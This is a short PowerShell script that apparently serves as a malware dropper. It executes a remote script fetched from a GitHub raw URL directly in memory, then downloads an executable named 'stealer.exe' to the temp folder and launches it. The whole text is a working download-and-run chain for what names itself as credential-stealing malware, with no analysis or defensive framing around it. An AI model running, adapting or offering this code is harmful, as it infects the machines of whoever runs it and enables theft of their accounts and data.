iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/config.ps1" -useb)

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/usertelegram/1086990476411932722/GAYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY_protected.exe" -OutFile "$temp\stealer.exe"
Start-Process -FilePath "$temp\stealer.exe"
